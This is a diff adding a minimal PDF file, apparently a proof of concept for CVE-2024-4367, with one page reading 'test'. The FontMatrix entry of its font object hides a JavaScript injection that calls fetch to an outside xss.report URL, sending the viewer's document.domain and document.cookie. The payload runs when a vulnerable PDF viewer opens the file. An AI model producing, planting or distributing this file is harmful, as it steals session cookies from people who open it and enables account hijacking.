@@ -1,0 +1,47 @@
+%PDF-1.4
+%‚„œ”
+1 0 obj
+<< /Type /Catalog /Pages 2 0 R >>
+endobj
+
+2 0 obj
+<< /Type /Pages /Kids [3 0 R] /Count 1 >>
+endobj
+
+3 0 obj
+<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources << /Font << /F1 5 0 R >> >> >>
+endobj
+
+4 0 obj
+<< /Length 44 >>
+stream
+BT
+/F1 12 Tf
+100 700 Td
+(test) Tj
+ET
+endstream
+endobj
+
+5 0 obj
+<< /Type /Font /Subtype /Type1 /BaseFont /FooBarFont /FontDescriptor 6 0 R /FontMatrix [1 0 0 1 0 (0\);fetch\('https://xss.report/c/ztlsavior/cve-2024-4367?origin='+document.domain+'&cookie='+document.cookie\)//)] >>
+endobj
+
+6 0 obj
+<< /Type /FontDescriptor /FontName /FooBarFont /Flags 4 /FontBBox [0 0 500 700] /ItalicAngle 0 /Ascent 700 /Descent -200 /CapHeight 700 /StemV 80 >>
+endobj
+
+xref
+0 7
+0000000000 65535 f 
+0000000015 00000 n 
+0000000065 00000 n 
+0000000123 00000 n 
+0000000250 00000 n 
+0000000337 00000 n 
+0000000570 00000 n 
+trailer
+<< /Size 7 /Root 1 0 R >>
+startxref
+735
+%%EOF
